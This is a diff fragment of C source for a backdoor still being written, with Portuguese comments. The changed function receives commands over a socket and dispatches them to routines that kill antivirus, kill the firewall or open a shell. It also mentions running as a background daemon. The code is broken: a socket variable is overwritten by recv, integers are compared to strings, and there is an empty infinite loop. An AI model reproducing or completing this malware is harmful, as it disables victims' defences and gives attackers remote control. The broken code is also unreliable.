@@ -184,7 +184,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
     return;
 }
-    void
+   void
     backdoor_connect()
 
     {
@@ -212,45 +212,31 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
      perror("setsockopt(SO_REUSEADDR)failed");
 
-     return;
+     char buf[1024];
 
-     //listen(x,10);
-
-
-}
-
-    void
-    execute()
-
-    {
-
-    char data;
-    int sockfd;
-    char buf[1024];
-
-    while(1);
-
-        data = recv(sockfd, buf, sizeof buf, 0);
-        if(data == false)
+        x = recv(x, buf, sizeof buf,  0 );
+        if(x == false)
 
         return;
+        while(1);
 
-             if(data == '1')
+             if(x == "killav")
              {
                 kill_antivirus();
             }
-            else if(data == '2')
+            else if(x == "killfw")
             {
                 kill_firewall();
             }
-            else if(data == '3')
+            else if(x == "shell")
             {
-                    auto_copy();
+                    shell();
             }
             else
 	         	sleep(0.2);
                 return;
             }
+
 
 
   /*função para o programa rodar em background, como uma daemon
